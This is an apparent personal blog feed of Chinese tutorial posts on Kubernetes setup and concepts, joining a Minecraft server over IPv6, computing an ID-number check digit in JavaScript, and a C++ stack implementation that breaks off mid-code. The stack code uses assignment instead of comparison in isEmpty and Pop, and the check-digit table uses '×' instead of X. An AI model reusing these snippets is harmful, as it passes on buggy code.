class="string">quay.io/coreos/flannel:v0.14.0</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/opt/bin/flanneld</span></span><br><span class="line">        <span class="attr">args:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--ip-masq</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--kube-subnet-mgr</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">requests:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">&quot;50Mi&quot;</span></span><br><span class="line">          <span class="attr">limits:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">&quot;50Mi&quot;</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">false</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span> [<span class="string">&quot;NET_ADMIN&quot;</span>, <span class="string">&quot;NET_RAW&quot;</span>]</span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAME</span></span><br><span class="line">          <span class="attr">valueFrom:</span></span><br><span class="line">            <span class="attr">fieldRef:</span></span><br><span class="line">              <span class="attr">fieldPath:</span> <span class="string">metadata.name</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAMESPACE</span></span><br><span class="line">          <span class="attr">valueFrom:</span></span><br><span class="line">            <span class="attr">fieldRef:</span></span><br><span class="line">              <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">run</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/run/flannel</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">flannel-cfg</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/etc/kube-flannel/</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">run</span></span><br><span class="line">        <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/run/flannel</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cni</span></span><br><span class="line">        <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/etc/cni/net.d</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">flannel-cfg</span></span><br><span class="line">        <span class="attr">configMap:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">kube-flannel-cfg</span></span><br></pre></td></tr></table></figure><h2 id="2-8-测试kubernetes-集群"><a href="#2-8-测试kubernetes-集群" class="headerlink" title="2.8 测试kubernetes 集群"></a>2.8 测试kubernetes 集群</h2><h3 id="2-8-1-部署nginx-测试"><a href="#2-8-1-部署nginx-测试" class="headerlink" title="2.8.1 部署nginx 测试"></a>2.8.1 部署nginx 测试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl create deployment nginx --image=nginx</span><br><span class="line"></span><br><span class="line">kubectl expose deployment nginx --port=80 --type=NodePort</span><br><span class="line"></span><br><span class="line">kubectl get pod,svc</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 1</title>
      <link href="/2022/07/08/7b9731ed4624-q1jun/"/>
      <url>/2022/07/08/7b9731ed4624-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Kubernetes介绍"><a href="#1-Kubernetes介绍" class="headerlink" title="1. Kubernetes介绍"></a>1. Kubernetes介绍</h1><h2 id="1-1-应用部署方式演变"><a href="#1-1-应用部署方式演变" class="headerlink" title="1.1 应用部署方式演变"></a>1.1 应用部署方式演变</h2><p>在部署应用程序的方式上，主要经历了三个时代：</p><ul><li><p><strong>传统部署</strong>：互联网早期，会直接将应用程序部署在物理机上</p><blockquote><p>优点：简单，不需要其它技术的参与</p><p>缺点：不能为应用程序定义资源使用边界，很难合理地分配计算资源，而且程序之间容易产生影响</p></blockquote></li><li><p><strong>虚拟化部署</strong>：可以在一台物理机上运行多个虚拟机，每个虚拟机都是独立的一个环境</p><blockquote><p>优点：程序环境不会相互产生影响，提供了一定程度的安全性</p><p>缺点：增加了操作系统，浪费了部分资源</p></blockquote></li><li><p><strong>容器化部署</strong>：与虚拟化类似，但是共享了操作系统</p><blockquote><p>优点：</p><p>可以保证每个容器拥有自己的文件系统、CPU、内存、进程空间等</p><p>运行应用程序所需要的资源都被容器包装，并和底层基础架构解耦</p><p>容器化的应用程序可以跨云服务商、跨Linux操作系统发行版进行部署</p></blockquote></li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200505183738289-20220719082713508.png" alt="image-20200505183738289"></p><p>容器化部署方式给带来很多的便利，但是也会出现一些问题，比如说：</p><ul><li>一个容器故障停机了，怎么样让另外一个容器立刻启动去替补停机的容器</li><li>当并发访问量变大的时候，怎么样做到横向扩展容器数量</li></ul><p>这些容器管理的问题统称为<strong>容器编排</strong>问题，为了解决这些容器编排问题，就产生了一些容器编排的软件：</p><ul><li><strong>Swarm</strong>：Docker自己的容器编排工具</li><li><strong>Mesos</strong>：Apache的一个资源统一管控的工具，需要和Marathon结合使用</li><li><strong>Kubernetes</strong>：Google开源的的容器编排工具</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200524150339551.png" alt="image-20200524150339551"></p><h2 id="1-2-kubernetes简介"><a href="#1-2-kubernetes简介" class="headerlink" title="1.2 kubernetes简介"></a>1.2 kubernetes简介</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200406232838722.png" alt="image-20200406232838722"></p><p>kubernetes，是一个全新的基于容器技术的分布式架构领先方案，是谷歌严格保密十几年的秘密武器—-Borg系统的一个开源版本，于2014年9月发布第一个版本，2015年7月发布第一个正式版本。</p><p>kubernetes的本质是<strong>一组服务器集群</strong>，它可以在集群的每个节点上运行特定的程序，来对节点中的容器进行管理。目的是实现资源管理的自动化，主要提供了如下的主要功能：</p><ul><li><strong>自我修复</strong>：一旦某一个容器崩溃，能够在1秒中左右迅速启动新的容器</li><li><strong>弹性伸缩</strong>：可以根据需要，自动对集群中正在运行的容器数量进行调整</li><li><strong>服务发现</strong>：服务可以通过自动发现的形式找到它所依赖的服务</li><li><strong>负载均衡</strong>：如果一个服务起动了多个容器，能够自动实现请求的负载均衡</li><li><strong>版本回退</strong>：如果发现新发布的程序版本有问题，可以立即回退到原来的版本</li><li><strong>存储编排</strong>：可以根据容器自身的需求自动创建存储卷</li></ul><h2 id="1-3-kubernetes组件"><a href="#1-3-kubernetes组件" class="headerlink" title="1.3 kubernetes组件"></a>1.3 kubernetes组件</h2><p>一个kubernetes集群主要是由**控制节点(master)<strong>、</strong>工作节点(node)**构成，每个节点上都会安装不同的组件。</p><p><strong>master：集群的控制平面，负责集群的决策 ( 管理 )</strong></p><blockquote><p><strong>ApiServer</strong> : 资源操作的唯一入口，接收用户输入的命令，提供认证、授权、API注册和发现等机制</p><p><strong>Scheduler</strong> : 负责集群资源调度，按照预定的调度策略将Pod调度到相应的node节点上</p><p><strong>ControllerManager</strong> : 负责维护集群的状态，比如程序部署安排、故障检测、自动扩展、滚动更新等</p><p><strong>Etcd</strong> ：负责存储集群中各种资源对象的信息</p></blockquote><p><strong>node：集群的数据平面，负责为容器提供运行环境 ( 干活 )</strong></p><blockquote><p><strong>Kubelet</strong> : 负责维护容器的生命周期，即通过控制docker，来创建、更新、销毁容器</p><p><strong>KubeProxy</strong> : 负责提供集群内部的服务发现和负载均衡</p><p><strong>Docker</strong> : 负责节点上容器的各种操作</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200406184656917.png" alt="image-20200406184656917"></p><p>下面，以部署一个nginx服务来说明kubernetes系统各个组件调用关系：</p><ol><li><p>首先要明确，一旦kubernetes环境启动之后，master和node都会将自身的信息存储到etcd数据库中</p></li><li><p>一个nginx服务的安装请求会首先被发送到master节点的apiServer组件</p></li><li><p>apiServer组件会调用scheduler组件来决定到底应该把这个服务安装到哪个node节点上</p><p>在此时，它会从etcd中读取各个node节点的信息，然后按照一定的算法进行选择，并将结果告知apiServer</p></li><li><p>apiServer调用controller-manager去调度Node节点安装nginx服务</p></li><li><p>kubelet接收到指令后，会通知docker，然后由docker来启动一个nginx的pod</p><p>pod是kubernetes的最小操作单元，容器必须跑在pod中至此，</p></li><li><p>一个nginx服务就运行了，如果需要访问nginx，就需要通过kube-proxy来对pod产生访问的代理</p></li></ol><p>这样，外界用户就可以访问集群中的nginx服务了</p><h2 id="1-4-kubernetes概念"><a href="#1-4-kubernetes概念" class="headerlink" title="1.4 kubernetes概念"></a>1.4 kubernetes概念</h2><p><strong>Master</strong>：集群控制节点，每个集群需要至少一个master节点负责集群的管控</p><p><strong>Node</strong>：工作负载节点，由master分配容器到这些node工作节点上，然后node节点上的docker负责容器的运行</p><p><strong>Pod</strong>：kubernetes的最小控制单元，容器都是运行在pod中的，一个pod中可以有1个或者多个容器</p><p><strong>Controller</strong>：控制器，通过它来实现对pod的管理，比如启动pod、停止pod、伸缩pod的数量等等</p><p><strong>Service</strong>：pod对外服务的统一入口，下面可以维护者同一类的多个pod</p><p><strong>Label</strong>：标签，用于对pod进行分类，同一类pod会拥有相同的标签</p><p><strong>NameSpace</strong>：命名空间，用来隔离pod的运行环境</p>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[花椒生存]使用IPV6进入花椒生存服务器</title>
      <link href="/2022/07/07/fca546aa028a-q1jun/"/>
      <url>/2022/07/07/fca546aa028a-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="使用IPV6进入花椒生存服务器"><a href="#使用IPV6进入花椒生存服务器" class="headerlink" title="使用IPV6进入花椒生存服务器"></a>使用IPV6进入花椒生存服务器</h1><blockquote><p>服务器IPv4地址：mc.q1jun.cn</p><p>服务器IPv6地址：v6.q1jun.cn</p><p>服务器QQ交流群：912457864</p><p>服务器开x黑啦：<a target="_blank" rel="noopener" href="https://kook.top/V0aEIh">https://kook.top/V0aEIh</a></p></blockquote><h2 id="0x01-什么是IPv6"><a href="#0x01-什么是IPv6" class="headerlink" title="0x01 什么是IPv6"></a>0x01 什么是IPv6</h2><p>其实，IPv6并不是一个新鲜事物。早在上个世纪90年代，它就已经诞生了。我相信大部分的小伙伴或多或少听说过它。</p><p><code>IPv6</code>的全称是<strong>Internet Protocol version 6</strong>。其中，Internet Protocol译为“互联网协议”。所以，IPv6就是<strong>互联网协议第6版</strong>。</p><p>既然IPv6是第6版（Version 6），说明在它之前有更老的版本。我们现在广泛使用的，就是<code>IPv4</code>，也就是第4版（Version 4）。</p><h2 id="0x02-为什么要用IPv6"><a href="#0x02-为什么要用IPv6" class="headerlink" title="0x02 为什么要用IPv6"></a>0x02 为什么要用IPv6</h2><p>IPv4迄今为止已经使用了30多年。最早期的时候，互联网只是设计给美国军方用的，根本没有考虑到它会变得如此庞大，成为全球网络。</p><p>尤其是进入21世纪后，随着计算机和智能手机的迅速普及，互联网开始爆发性发展，越来越多的上网设备出现，越来越多的人开始连接互联网。这就意味着，需要越来越多的IP地址。</p><p>IPv4到底一共有多少个IP地址呢？答案是2的32次方，也就是约<code>42.9亿个</code>。</p><p>所以说，IPv4地址池接近枯竭，根本无法满足互联网发展的需要。人们迫切需要更高版本的IP协议，更大数量的IP地址池。（有点像固定电话号码升位。）</p><p>IPv4的地址池是约42.9亿，IPv6能达到多少呢？</p><p>数量如下——</p><p><code>340282366920938463463374607431768211456</code>个…</p><p>不用数了，数到后面脑子就会秀逗了…</p><p>简单说，是<code>2的128</code>次方。</p><p>这个数量，即使是给地球上每一颗沙子都分配一个IP，也是妥妥够用的。</p><p>下面这样的，就是一个标准的、合法的IPv6地址示例：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2001:0db8:85a3:08d3:1319:8a2e:0370:7344</span><br></pre></td></tr></table></figure><p>不过这谁记得住啊，不用担心，IPv6也可以通过DNS进行解析成域名：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6.q1jun.cn</span><br></pre></td></tr></table></figure><blockquote><p>除了地址数量之外，IPv6还有很多优点，例如：</p><p>1、IPv6使用更小的路由表。使得路由器转发数据包的速度更快。</p><p>2、IPv6增加了增强的组播支持以及对流的控制，对多媒体应用很有利，对服务质量（QoS）控制也很有利。</p><p>3、IPv6加入了对自动配置的支持。这是对DHCP协议的改进和扩展，使得网络（尤其是局域网）的管理更加方便和快捷。</p><p>4、IPv6具有更高的安全性。用户可以对网络层的数据进行加密并对IP报文进行校验，极大地增强了网络的安全性。</p><p>5、IPv6具有更好的扩容能力。如果新的技术或应用需要时，IPV6允许协议进行扩充。</p><p>6、IPv6具有更好的头部格式。IPV6使用新的头部格式，就简化和加速了路由选择过程，提高了效率。</p></blockquote><h2 id="0x03-测试IPv6是否可用"><a href="#0x03-测试IPv6是否可用" class="headerlink" title="0x03 测试IPv6是否可用"></a>0x03 测试IPv6是否可用</h2><p>查看当前电脑是否能通过IPv6上网可以在浏览器打开以下网址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://testipv6.cn</span><br></pre></td></tr></table></figure><p>等待测试结果即可。</p><h2 id="0x04-使用进入MC"><a href="#0x04-使用进入MC" class="headerlink" title="0x04 使用进入MC"></a>0x04 使用进入MC</h2><p>在mc的<code>多人游戏</code>中点击<kbd>添加服务器</kbd></p><p>输入解析后的IPv6域名：<code>v6.q1jun.cn</code>即可：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220707225625000.png" alt="image-20220707225625000"></p><p>点击<kbd>完成</kbd>后返回服务器列表就可以看到<code>新添加的服务器</code>了。</p><p>最后双击进入！开始狂欢吧！</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220707225830279.png" alt="image-20220707225830279"></p>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> 花椒生存 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Minecraft </tag>
            
            <tag> 我的世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算居民身份证校验码</title>
      <link href="/2022/07/03/cbac55735a57-q1jun/"/>
      <url>/2022/07/03/cbac55735a57-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="计算校验位"><a href="#计算校验位" class="headerlink" title="计算校验位"></a>计算校验位</h2><p>记录一个计算第二代居民身份证最后一位<code>校验位</code>的算法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">calc</span>(<span class="params">str</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> coeff = [<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> suffix = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;×&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> sum = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">17</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">                sum += coeff[i] * <span class="built_in">parseInt</span>(str.<span class="title function_">charCodeAt</span>(i)-<span class="number">48</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            sum %= <span class="number">11</span>;</span></span><br><span class="line"><span class="language-javascript">            str = str.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">17</span>) + suffix[sum];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> str;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(calc(prompt(&#x27;请输入待计算的身份证号(前十七位)&#x27;)))&quot;</span>&gt;</span>计算<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在输入框输入待校验的身份证前17位（身份证共有18位）：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220703220416610.png" alt="image-20220703220416610"></p><p>点击<kbd>确定</kbd>，补全身份证最后一位<code>校验位</code>：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220703220609589.png" alt="image-20220703220609589"></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[数据结构]栈</title>
      <link href="/2022/06/23/757c5c7e8603-q1jun/"/>
      <url>/2022/06/23/757c5c7e8603-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="栈的基本概念"><a href="#栈的基本概念" class="headerlink" title="栈的基本概念"></a>栈的基本概念</h2><blockquote><p>数据结构的三要素 – 逻辑结构、数据运算、存储结构 。<br>(存储结构存储结构不同，运算的实现方式不同。)</p></blockquote><p><strong>栈</strong> （Stack）是只允许在一端进行插入或删除操作的<code>线性表</code>。即栈是一种线性表，但限定这种线性表只能在某一端进行插入和删除操作。</p><p><code>栈顶</code>（Top）：线性表允许插入删除的那一端。</p><p><code>栈底</code>（Bottom）：固定的，不允许进行插入和删除的一端。</p><p><code>空栈</code>：不包含任何元素的栈。</p><p><code>栈道操作特性</code>：后进先出（Last In First Out，LIFO）。</p><p><code>栈的数学性质</code>： $n$个不同元素进栈，出栈元素不同排列的个数为$\frac1{n+1}C^n_{2n}$。上述公式称为卡特兰（Catalan）数，可采用数学归纳法证明。</p><hr><p>栈道基本操作：</p><ul><li><code>InitStack(&amp;S)</code>：初始化栈。构造一个空栈S，分配内存空间。</li><li><code>DestroyStack(&amp;S)</code>：销毁栈，并释放栈S所占用的内存空间。</li><li><code>Push(&amp;S, x)</code>：<strong>进栈</strong>，若栈S未满，则将x加入使之成为新栈顶。</li><li><code>Pop(&amp;S, &amp;x)</code>：<strong>出栈</strong>，若栈S非空，则弹出栈顶元素，并将x返回。</li><li><code>GetTop(S, &amp;x)</code>：读取栈顶元素。若栈S非空，则用x返回栈顶元素。</li><li><code>StackEmpty(S)</code>：判断栈S是否为空。若S为空，则返回true，否则返回false</li></ul><h2 id="顺序栈的定义"><a href="#顺序栈的定义" class="headerlink" title="顺序栈的定义"></a>顺序栈的定义</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10 <span class="comment">//栈中元素最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> data[MaxSize]; <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top; <span class="comment">//栈顶</span></span><br><span class="line">&#125;SequenceStack;</span><br></pre></td></tr></table></figure><p>栈的初始化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 初始化栈</span></span><br><span class="line"><span class="comment"> * @param &#123;SequenceStack&amp;&#125; S 输入栈</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SequenceStack&amp; S)</span> </span>&#123;</span><br><span class="line">    S.top = <span class="number">-1</span>; <span class="comment">//初始化栈顶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈的判空：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 栈判空</span></span><br><span class="line"><span class="comment"> * @param &#123;SequenceStack&#125; S</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">(SequenceStack S)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top = <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>入栈：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 入栈操作</span></span><br><span class="line"><span class="comment"> * @param &#123;SequenceStack&amp;&#125; S 顺序栈</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e 入栈元素</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Push</span><span class="params">(SequenceStack&amp; S, <span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == MaxSize - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈已满&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    S.top += <span class="number">1</span>; <span class="comment">//调整栈顶位置</span></span><br><span class="line">    S.data[S.top] = e; <span class="comment">//新元素入栈</span></span><br><span class="line">    <span class="comment">//等价于 S.data[++S.top] = e;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出栈：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 出栈</span></span><br><span class="line"><span class="comment"> * @param &#123;SequenceStack&amp;&#125; S 顺序栈</span></span><br><span class="line"><span class="comment"> * @param &#123;int&amp;&#125; e 出栈元素</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Pop</span><span class="params">(SequenceStack&amp; S, <span class="type">int</span>&amp; e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top = <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈已空，无元素返回&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    e = S.data[S.top]; <span class="comment">//栈顶元素先出栈</span></span><br><span class="line">    S.top -= <span class="number">1</span>; <span class="comment">//调整栈顶位置</span></span><br><span class="line">    <span class="comment">//等价于 e = S.data[S.top--];</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取栈顶元素：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 获取栈顶元素</span></span><br><span class="line"><span class="comment"> * @param &#123;SequenceStack&#125; S 顺序栈</span></span><br><span class="line"><span class="comment"> * @param &#123;int&amp;&#125; e 栈顶元素</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetTop</span><span class="params">(SequenceStack S, <span class="type">int</span>&amp; e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.top == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈已空，无元素返回&quot;</span>);</span><br><span class="line">        <span 